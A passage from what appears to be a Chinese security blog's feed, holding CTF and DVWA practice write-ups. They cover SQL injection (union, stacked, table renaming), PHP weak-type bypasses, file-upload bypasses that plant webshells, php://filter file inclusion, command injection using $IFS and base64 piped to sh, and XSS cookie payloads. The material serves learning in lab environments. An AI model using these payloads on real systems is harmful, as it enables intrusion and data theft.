<p>union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中，也就是说可以构造一个不存在数据，就会创造一个虚拟的数据，构造playload:</p>
<pre><code>name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&amp;pw=123456
</code></pre>
<p>'e10adc3949ba59abbe56e057f20f883e'即123456的MD5，注入语句在后台数据库中插入一个用户名为admin，密码为123456的数据，登录即得flag</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415191059744.png" alt="image-20220415191059744" loading="lazy"></figure>
<h2 id="actf2020-新生赛backupfile">[ACTF2020 新生赛]BackupFile</h2>
<p>题目有提示backupfile，也就是<code>备份文件</code>，尝试<code>index.php.bak</code>,下载备份文件，得到flag.php</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415191257713.png" alt="image-20220415191254602" loading="lazy"></figure>
<h3 id="弱类型比较"><code>弱类型比较</code>：</h3>
<pre><code>1、 字符串和数字比较，字符串会转换为数字 admin--&gt;0

2、混合字符串转换为数字，看字符串的第一个 1admin--&gt;1  admin1--&gt;0

3、字符串以xex开头（x表示数字），会被转换为科学计数法2e2=2*10^2=200  0e2=0e48=0
</code></pre>
<p>也就是说key=123就可以绕过key==str,playload:?key=123,得flag</p>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415191348338.png" alt="image-20220415191348338" loading="lazy"></figure>
<h2 id="极客大挑战-2019buyflag">[极客大挑战 2019]BuyFlag</h2>
<p>源码中的一些提示：</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415191401932.png" alt="image-20220415191401932" loading="lazy"></figure>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415191407164.png" alt="image-20220415191407164" loading="lazy"></figure>
<p>抓包后看到cookie里的user=0，改为1，即从假改为真，回显</p>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415191414919.png" alt="image-20220415191414919" loading="lazy"></figure>
<p>再根据条件上传钱和密码，密码存在弱类型比较，</p>
<pre><code>playload：password=404a&amp;money=10000000
</code></pre>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415191422069.png" alt="image-20220415191422069" loading="lazy"></figure>
<p>绕过了密码，但说钱太长了，改为科学计数</p>
<pre><code>Playload：password=404a&amp;money=1e9，得到flag
</code></pre>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415191440479.png" alt="image-20220415191440479" loading="lazy"></figure>
<h2 id="actf2020-新生赛upload">[ACTF2020 新生赛]Upload</h2>
<p>存在<code>前端过滤</code></p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415191511501.png" alt="image-20220415191511501" loading="lazy"></figure>
<p>把文件改成gif，抓包再改成php</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415191522197.png" alt="image-20220415191522197" loading="lazy"></figure>
<p>回显 <img src="https://z0ekball.github.io/post-images/image-20220415191532725.png" alt="image-20220415191532725" loading="lazy"></p>
<p>用phtml绕过php过滤，得到文件路径</p>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415191552251.png" alt="image-20220415191552251" loading="lazy"></figure>
<p>访问页面</p>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415191602138.png" alt="image-20220415191602138" loading="lazy"></figure>
<p>蚁剑连接，得到webshell,命令行寻找flag</p>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415191615940.png" alt="image-20220415191615940" loading="lazy"></figure>
<h2 id="mrctf2020你传你呢">[MRCTF2020]你传你🐎呢</h2>
<h3 id="htaccess绕过"><code>htaccess绕过</code>:</h3>
<p>构造一个把同名文件解析成php格式的htaccess文件</p>
<pre><code>//把hack.png解析成php

&lt;FilesMatch &quot;hack.png&quot;&gt;

SetHandler application/x-httpd-php

&lt;/FilesMatch&gt;
</code></pre>
<p>上传htaccess文件，抓包修改类型为png</p>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415191745173.png" alt="image-20220415191745173" loading="lazy"></figure>
<p>再上传一个含有木马的假png，上传成功</p>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415191753176.png" alt="image-20220415191753176" loading="lazy"></figure>
<p>蚁剑连接，找到flag</p>
<h2 id="suctf-2019easysql">[SUCTF 2019]EasySQL</h2>
<p>抓包进行sql注入的<code>fuzz测试</code></p>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415191815733.png" alt="image-20220415191815733" loading="lazy"></figure>
<p>被过滤部分，回显nonono</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415191827267.png" alt="image-20220415191827267" loading="lazy"></figure>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415191841841.png" alt="image-20220415191834335" loading="lazy"></figure>
<p>绕过这些语句和符号进行注入</p>
<p>采用<code>堆叠注入</code>：</p>
<p>查库：</p>
<pre><code>1;show databases;
</code></pre>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415191912937.png" alt="image-20220415191912937" loading="lazy"></figure>
<p>查表：</p>
<pre><code>1;show tables;
</code></pre>
<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415191925237.png" alt="image-20220415191925237" loading="lazy"></figure>
<p>查flag里的数据：</p>
<pre><code>1;show columns from Flag;
</code></pre>
<p>无法访问</p>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415192015126.png" alt="image-20220415192015126" loading="lazy"></figure>
<p>由于输入字母不回显，只有输入数字才回显</p>
<p>推测后台sql语句含有||（or），即select （注入语句）|| flag from Flag</p>
<pre><code>构造*，1，即select *,1 || flag from Flag意思为select *,1 from Flag，即可显示所有内容
</code></pre>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415192051097.png" alt="image-20220415192051097" loading="lazy"></figure>
<h2 id="actf2020-新生赛include">[ACTF2020 新生赛]Include</h2>
<p>提示：</p>
<figure data-type="image" tabindex="38"><img src="https://z0ekball.github.io/post-images/image-20220415192105507.png" alt="image-20220415192105507" loading="lazy"></figure>
<p>采用<code>伪协议</code>方法读取flag</p>
<p>构造：</p>
<pre><code>file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>返回flag.php的base64编码</p>
<figure data-type="image" tabindex="39"><img src="https://z0ekball.github.io/post-images/image-20220415192127801.png" alt="image-20220415192127801" loading="lazy"></figure>
<p>解密得flag</p>
<figure data-type="image" tabindex="40"><img src="https://z0ekball.github.io/post-images/image-20220415192136925.png" alt="image-20220415192136925" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CTF刷题记录(一)]]></title>
        <id>https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-yi/</id>
        <link href="https://z0ekball.github.io/post/ctf-shua-ti-ji-lu-yi/">
        </link>
        <updated>2021-12-02T18:20:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="hctf-2018warmup">[HCTF 2018]WarmUp</h2>
<p>文件包含，代码审计。</p>
<p>根据提示查看source.php看到源码，进行代码审计。</p>
<pre><code class="language-php">&lt;?php

  highlight_file(__FILE__);  //高光显示

  class emmm    //定义一个类

  {

​    public static function checkFile(&amp;$page)   //定义一个函数

​    {

​      $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];  //定义白名单

​      if (! isset($page) || !is_string($page)) {     //isset（）判断变量是否声明，is_string判断变量是否为字符串

​         echo &quot;you can't see it&quot;;

​        return false;

​      }

​      if (in_array($page, $whitelist)) {    //in_array判断page是否在白名单数组中

​        return true;

​      }

​      $_page = mb_substr(       //mb_substr(str,start,length)从start开始截取str字符串length长

​        $page,

​        0,

​        mb_strpos($page . '?', '?')   //mb_strpos返回要查找字符串的首次出现位置,page.’?’拼接一个‘？’

​      );

​      if (in_array($_page, $whitelist)) {

​        return true;

​      }

​      $_page = urldecode($page); //url解码

​      $_page = mb_substr(

​        $_page,

​        0,

​        mb_strpos($_page . '?', '?')

​      );

​      if (in_array($_page, $whitelist)) {

​        return true;

​      }

​      echo &quot;you can't see it&quot;;

​      return false;

​    }

  }

  if (! empty($_REQUEST['file']) //请求file且file满足下列条件

​    &amp;&amp; is_string($_REQUEST['file'])

​    &amp;&amp; emmm::checkFile($_REQUEST['file'])

  ) {

​    include $_REQUEST['file'];  

​    exit;

  } else {

​    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;

  } 

?&gt;
</code></pre>
<p><code>总体理解</code>：请求file，cehckfile对其进行了三次白名单检测，2次问号截断，1次url解码，需要构造语句绕过这些检测。</p>
<p>Hint.php给出提示，flag就在ffffllllaaaagggg文件里，结合文件包含访问这个文件</p>
<p>​                <img src="https://z0ekball.github.io/post-images/image-20220415020227298.png" alt="image-20220415020227298" loading="lazy"></p>
<p><code>构造语句</code>：</p>
<pre><code>file=source.php?../../../../../ffffllllaaaagggg
</code></pre>
<p>直接绕过第一次白名单检测，？截断语句成source.php绕过前第二次白名单检测，剩下source.php在拼接上‘？’和上一步一样第三次白名单检测，返回true之后执行文件包含漏洞执行后续语句，得到flag</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415020240200.png" alt="image-20220415020240200" loading="lazy"></figure>
<h2 id="极客大挑战-2019easysql">[极客大挑战 2019]EasySQL</h2>
<p>简单get型sql注入</p>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415020340624.png" alt="image-20220415020326438" loading="lazy"></figure>
<h2 id="极客大挑战-2019havefun">[极客大挑战 2019]Havefun</h2>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415020407768.png" alt="image-20220415020407768" loading="lazy"></figure>
<p>Get方式提交请求/?cat=dog</p>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415020424699.png" alt="image-20220415020424699" loading="lazy"></figure>
<h2 id="强网杯-2019随便注">[强网杯 2019]随便注</h2>
<p>1’/<strong>/or/</strong>/1&gt;0#有回显，存在注入点</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415020507896.png" alt="image-20220415020507896" loading="lazy"></figure>
<p>1'union(select/<strong>/database(),2/</strong>/)#回显</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415020516607.png" alt="image-20220415020516607" loading="lazy"></figure>
<p>说明存在过滤，试试大小写绕过，不行。Sqlmap也无法注入，搜查资料发现是堆叠注入。</p>
<h3 id="堆叠注入"><code>堆叠注入</code>：</h3>
<p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p>
<p>查库注入语句：</p>
<pre><code>0';show database();#
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415020601094.png" alt="image-20220415020601094" loading="lazy"></figure>
<p>查表注入语句：0';show tables;#回显</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415020618420.png" alt="image-20220415020618420" loading="lazy"></figure>
<pre><code>0';desc `1919810931114514`;#
</code></pre>
<p>查询第一个表</p>
<pre><code>0';desc `1919810931114514`;#（desc 表示降序显示该表，注：需用反引号括起表名）
</code></pre>
<p>flag就在其中</p>
<p>查询第二个表</p>
<pre><code>0';desc words;#
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415020724217.png" alt="image-20220415020724217" loading="lazy"></figure>
<p>不难看出，查询的后端语句可能为select id,data from words where id=，</p>
<p>但flag在另一个表中无法直接读出，这时候可以通过修改表名，使得查询语句查询的是flag表从而回显变成flag。</p>
<p><code>更换表名语句</code>：rename table A to B</p>
<p><code>更换属性名语句</code>：alter table A change x to b</p>
<p>注入语句：</p>
<pre><code>0';rename table `words` to w;rename table `1919810931114514` to words;alter table `words` change flag id varchar(100);# (表名要用反引号括起)
</code></pre>
<p>再次查表，换名成功</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415020820891.png" alt="image-20220415020820891" loading="lazy"></figure>
<p>再次输入1’or 1&gt;0#，得到flag</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415020828269.png" alt="image-20220415020828269" loading="lazy"></figure>
<h2 id="极客大挑战-2019knife">[极客大挑战] 2019Knife</h2>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415020846527.png" alt="image-20220415020846527" loading="lazy"></figure>
<p>很直白，蚁剑连接拿到flag</p>
<h2 id="gxyctf2019babyupload">[GXYCTF2019]BabyUpload</h2>
<p>不能含有ph，尝试用<code>Apache漏洞</code>php.xxx绕过，不成功。</p>
<p>上传<code>.htaccess文件</code>，.htaccess文件内容为把同名文件2.jpeg解析为php文件</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415020917405.png" alt="image-20220415020917405" loading="lazy"></figure>
<p><code>MIME绕过</code>，content-type改为image/jpeg绕过文件类型检查</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415020924311.png" alt="image-20220415020924311" loading="lazy"></figure>
<p>再上传一个含有一句话木马的同名文件2.jpeg</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415020955280.png" alt="image-20220415020955280" loading="lazy"></figure>
<p>上传成功，访问jpeg文件成功，说明已被解析为php，蚁剑连接找到flag</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415021012924.png" alt="image-20220415021005376" loading="lazy"></figure>
<h2 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h2>
<p>网页源码得到信息并访问</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415021030051.png" alt="image-20220415021030051" loading="lazy"></figure>
<p>得到以下页面，点击按钮显示查阅完毕</p>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415021035545.png" alt="image-20220415021035545" loading="lazy"></figure>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415021054851.png" alt="image-20220415021054851" loading="lazy"></figure>
<p>查看网页源码，显示跳转的是action页面，但最终给出的页面是end.php</p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415021114833.png" alt="image-20220415021114833" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415021122956.png" alt="image-20220415021122956" loading="lazy"></figure>
<p>使用burpsuit截拦action，得到信息secr3t.php</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415021135755.png" alt="image-20220415021135755" loading="lazy"></figure>
<p>访问该页面得到以下源代码</p>
<figure data-type="image" tabindex="23"><img src="https://z0ekball.github.io/post-images/image-20220415021140901.png" alt="image-20220415021140901" loading="lazy"></figure>
<p>意思是get传入一个文件名，文件名不能包含../、tp、input、data，包括其大小写，如果能够绕过这些过滤的话，传入的文件名就会被文件包含，同时提示了flag就在flag.php里。</p>
<p>考虑使用伪协议进行绕过，过滤了php://input，但没过滤php://filter</p>
<h3 id="伪协议"><code>伪协议</code>：</h3>
<p><code>php://</code> 访问各个输入/输出流（I/O streams）；</p>
<p><code>php://filter</code>用于读取源码，读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了；</p>
<p><code>php://input</code>用于执行php代码，可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<p>结合文件包含漏洞构造</p>
<pre><code>playload:?file=php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p>返回的是base64编码</p>
<figure data-type="image" tabindex="24"><img src="https://z0ekball.github.io/post-images/image-20220415021255672.png" alt="image-20220415021255672" loading="lazy"></figure>
<p>解码得出flag</p>
<figure data-type="image" tabindex="25"><img src="https://z0ekball.github.io/post-images/image-20220415021306057.png" alt="image-20220415021306057" loading="lazy"></figure>
<h2 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h2>
<p>输入ip=1，回显</p>
<figure data-type="image" tabindex="26"><img src="https://z0ekball.github.io/post-images/image-20220415021318613.png" alt="image-20220415021318613" loading="lazy"></figure>
<p>利用Linux 命令执行的管道符漏洞</p>
<h3 id="管道符"><code>管道符</code>：</h3>
<p><code>Windows</code>:</p>
<pre><code>Ping 2|whoami：直接执行后面语句；

Ping 2||whoami：前面语句为假时执行后面语句，前者只能是假

Ping 2&amp;whoami：前面语句为假时执行后面语句，前者可假可真

Ping 2&amp;&amp;whoami：前面语句为假则不执行后者
</code></pre>
<p><code>Linux</code>:</p>
<pre><code>Ping 2;whoami：执行完前者执行后者

Ping 2|whoami：直接执行后者

Ping 2||whoami：前面语句为假时执行后面语句，前者只能是假

Ping 2&amp;whoami：前面语句为假时执行后面语句，前者可假可真

Ping 2&amp;&amp;whoami：前面语句为假则不执行后者

构造playload:?ip=1;ls //返回当前目录
</code></pre>
<p>尝试访问flag.php</p>
<pre><code>playload:?ip=1;cat flag.php
</code></pre>
<figure data-type="image" tabindex="27"><img src="https://z0ekball.github.io/post-images/image-20220415021417955.png" alt="image-20220415021417955" loading="lazy"></figure>
<p>过滤空格，<code>$IFS$1</code>绕过空格</p>
<pre><code>playload:?ip=1;cat$IFS$1flag.php
</code></pre>
<figure data-type="image" tabindex="28"><img src="https://z0ekball.github.io/post-images/image-20220415021531101.png" alt="image-20220415021531101" loading="lazy"></figure>
<p>过滤了flag,再用变量绕过敏感字符</p>
<pre><code>playload:?ip=1;b=g;cat$IFS$1fla$b.php
</code></pre>
<p>在网页源码找到了flag</p>
<figure data-type="image" tabindex="29"><img src="https://z0ekball.github.io/post-images/image-20220415021622936.png" alt="image-20220415021622936" loading="lazy"></figure>
<p><code>多解</code>：</p>
<p>先对 cat flag.php 进行<code>base64 加密</code>，过滤 bash ，那就用 sh</p>
<pre><code>Playload：?ip=1; echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
</code></pre>
<p>内联执行，使用 `` 代替 | ，将反引号内命令执行两次</p>
<h2 id="第一章-web入门常见的搜集">[第一章 web入门]常见的搜集</h2>
<figure data-type="image" tabindex="30"><img src="https://z0ekball.github.io/post-images/image-20220415021727374.png" alt="image-20220415021727374" loading="lazy"></figure>
<p>源码看不到什么信息，根据提示查找<code>敏感文件</code>：</p>
<pre><code>1.gedit备份文件，格式为filename,如index.php 
 2.vim备份文件，格式为.filename.swp或者*.swo或者*.swn，比 如.index.php.swp
 3.robots.txt
</code></pre>
<p>查robots.txt</p>
<figure data-type="image" tabindex="31"><img src="https://z0ekball.github.io/post-images/image-20220415021748561.png" alt="image-20220415021748561" loading="lazy"></figure>
<p>根据提示访问</p>
<figure data-type="image" tabindex="32"><img src="https://z0ekball.github.io/post-images/image-20220415021755420.png" alt="image-20220415021755420" loading="lazy"></figure>
<p>访问index.php~</p>
<figure data-type="image" tabindex="33"><img src="https://z0ekball.github.io/post-images/image-20220415021836827.png" alt="image-20220415021836827" loading="lazy"></figure>
<p>访问index.php.swp,下载文件</p>
<figure data-type="image" tabindex="34"><img src="https://z0ekball.github.io/post-images/image-20220415021844720.png" alt="image-20220415021844720" loading="lazy"></figure>
<figure data-type="image" tabindex="35"><img src="https://z0ekball.github.io/post-images/image-20220415021852565.png" alt="image-20220415021852565" loading="lazy"></figure>
<p>三段flag拼接即是flag</p>
<h2 id="第一章-web入门粗心的小李">[第一章 web入门]粗心的小李</h2>
<p>题目提示与<code>git相关</code>，下载githack，执行命令</p>
<p>​          <img src="https://z0ekball.github.io/post-images/image-20220415021939161.png" alt="image-20220415021939161" loading="lazy"></p>
<figure data-type="image" tabindex="36"><img src="https://z0ekball.github.io/post-images/image-20220415021946109.png" alt="image-20220415021946109" loading="lazy"></figure>
<p>打开githack文件下的index.html得到flag</p>
<figure data-type="image" tabindex="37"><img src="https://z0ekball.github.io/post-images/image-20220415021957944.png" alt="image-20220415021957944" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(XSS)]]></title>
        <id>https://z0ekball.github.io/post/dvwaxss/</id>
        <link href="https://z0ekball.github.io/post/dvwaxss/">
        </link>
        <updated>2021-11-15T15:44:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="xssreflected-low">XSS(Reflected)-Low</h2>
<p>查看源码，对name参数没有任何过滤和检查<br>
​                         <img src="https://z0ekball.github.io/post-images/image-20220415014029290.png" alt="image-20220415014029290" loading="lazy"></p>
<p>输入一段JavaScript代码：<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，返回一个弹窗，攻击成功</p>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415014034811.png" alt="image-20220415014034811" loading="lazy"></figure>
<p>获取cookie:<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415014038390.png" alt="image-20220415014038390" loading="lazy"></figure>
<h2 id="xssreflected-medium">XSS(Reflected)- Medium</h2>
<p>查看源码，发现存在对script的简单过滤，匹配<code>&lt;script&gt;</code>换成null，只执行一次</p>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415014047015.png" alt="image-20220415014047015" loading="lazy"></figure>
<p>采用双写绕过，输入<code>&lt;scr&lt;script&gt;ipt&gt;alert('xss')&lt;/script&gt;</code></p>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415014050608.png" alt="image-20220415014050608" loading="lazy"></figure>
<h2 id="xssreflected-high">XSS(Reflected)-High</h2>
<p>查看源码，采用正则表达式过滤，故无法使用大小写绕过和双写绕过</p>
<figure data-type="image" tabindex="5"><img src="https://z0ekball.github.io/post-images/image-20220415014058357.png" alt="image-20220415014058357" loading="lazy"></figure>
<p>换一种标签，输入：<code>&lt;img src=&quot;&quot; onerror=&quot;alert('xss')&quot;&gt;</code>，攻击成功</p>
<figure data-type="image" tabindex="6"><img src="https://z0ekball.github.io/post-images/image-20220415014101999.png" alt="image-20220415014101999" loading="lazy"></figure>
<h2 id="xssstored-low">XSS(Stored)-Low</h2>
<p>输入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>，有弹窗</p>
<figure data-type="image" tabindex="7"><img src="https://z0ekball.github.io/post-images/image-20220415014119504.png" alt="image-20220415014107878" loading="lazy"></figure>
<p>输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code>，设计一个按钮打开弹窗</p>
<figure data-type="image" tabindex="8"><img src="https://z0ekball.github.io/post-images/image-20220415014125565.png" alt="image-20220415014125565" loading="lazy"></figure>
<p>输入<code>&lt;a href=http://www.bilibili.com&gt;click&lt;/a&gt;</code>，按下按钮打开bilibili网页</p>
<figure data-type="image" tabindex="9"><img src="https://z0ekball.github.io/post-images/image-20220415014129626.png" alt="image-20220415014129626" loading="lazy"></figure>
<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，返回页面cookie</p>
<figure data-type="image" tabindex="10"><img src="https://z0ekball.github.io/post-images/image-20220415014136222.png" alt="image-20220415014136222" loading="lazy"></figure>
<h2 id="xssstored-medium">XSS(Stored)-Medium</h2>
<p>查看源码，message参数把需要转义的字符进行转义防止了xss攻击</p>
<figure data-type="image" tabindex="11"><img src="https://z0ekball.github.io/post-images/image-20220415014216650.png" alt="image-20220415014216650" loading="lazy"></figure>
<p>转义结果</p>
<figure data-type="image" tabindex="12"><img src="https://z0ekball.github.io/post-images/image-20220415014144308.png" alt="image-20220415014144308" loading="lazy"></figure>
<p>name参数对<code>&lt;script&gt;</code>有简单过滤，替换第一个<code>&lt;script&gt;</code>，且限制输入10个字符</p>
<figure data-type="image" tabindex="13"><img src="https://z0ekball.github.io/post-images/image-20220415014226987.png" alt="image-20220415014226987" loading="lazy"></figure>
<p>抓包，进行简单绕过</p>
<figure data-type="image" tabindex="14"><img src="https://z0ekball.github.io/post-images/image-20220415014233230.png" alt="image-20220415014233230" loading="lazy"></figure>
<p>编码成url</p>
<figure data-type="image" tabindex="15"><img src="https://z0ekball.github.io/post-images/image-20220415014238817.png" alt="image-20220415014238817" loading="lazy"></figure>
<p>成功执行</p>
<figure data-type="image" tabindex="16"><img src="https://z0ekball.github.io/post-images/image-20220415014242586.png" alt="image-20220415014242586" loading="lazy"></figure>
<p>获取cookie</p>
<figure data-type="image" tabindex="17"><img src="https://z0ekball.github.io/post-images/image-20220415014249018.png" alt="image-20220415014249018" loading="lazy"></figure>
<figure data-type="image" tabindex="18"><img src="https://z0ekball.github.io/post-images/image-20220415014317151.png" alt="image-20220415014258608" loading="lazy"></figure>
<h2 id="xssstored-high">XSS(Stored)-High</h2>
<p>查看源码，在medium的基础上对script进行严格过滤</p>
<figure data-type="image" tabindex="19"><img src="https://z0ekball.github.io/post-images/image-20220415014343501.png" alt="image-20220415014343501" loading="lazy"></figure>
<p>不使用script即可，输入<code>&lt;a href='' onclick=alert('xss')&gt;click&lt;/a&gt;</code></p>
<figure data-type="image" tabindex="20"><img src="https://z0ekball.github.io/post-images/image-20220415014350676.png" alt="image-20220415014350676" loading="lazy"></figure>
<figure data-type="image" tabindex="21"><img src="https://z0ekball.github.io/post-images/image-20220415014357200.png" alt="image-20220415014357200" loading="lazy"></figure>
<p>攻击成功</p>
<figure data-type="image" tabindex="22"><img src="https://z0ekball.github.io/post-images/image-20220415014402390.png" alt="image-20220415014402390" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DVWA练习(SQL Injection)]]></title>
        <id>https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/</id>
        <link href="https://z0ekball.github.io/post/dvwa-lian-xi-sql-injection/">
        </link>
        <updated>2021-10-26T17:30:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="sql-injection-low">SQL Injection-Low</h2>
<p>抓包<br>
<img src="https://z0ekball.github.io/post-images/image-20220415011925419.png" alt="image-20220415011925419" loading="lazy"></p>
<p>直接用<code>sqlmap</code></p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --dbs
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://z0ekball.github.io/post-images/image-20220415011952778.png" alt="image-20220415011952778" loading="lazy"></figure>
<p>说明需要上传cookie，加上抓包的cookie即可</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; --dbs
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://z0ekball.github.io/post-images/image-20220415012023569.png" alt="image-20220415012023569" loading="lazy"></figure>
<p>爆表：</p>
<pre><code class="language-sql">
sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa –tables
</code></pre>
<figure data-type="image" tabindex="3"><img src="https://z0ekball.github.io/post-images/image-20220415012047969.png" alt="image-20220415012047969" loading="lazy"></figure>
<p>爆列：</p>
<pre><code class="language-sql">sqlmap -u &quot;http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=ad&amp;Submit=Submit#&quot; --cookie=&quot;security=low; deviceid=1637736638476; xinhu_mo_adminid=tlt0tln0jm0vj0tll0at0jo0vf0aj0mt0fl0tlv0aa0ja0ah0mj011; xinhu_ca_adminuser=admin; xinhu_ca_rempass=1; xinhu_ca_adminpass=zz0er0zg0dii0ze0qe0ec0cb01; PHPSESSID=kbnfql7gssetlsjdcvp8btvr13&quot; -D dvwa -T users –columns
</code></pre>
<figure data-type="image" tabindex="4"><img src="https://z0ekball.github.io/post-images/image-20220415012103755.png" alt="image-20220415012103755" loading="lazy"></figure>
<p>爆字段：</p>
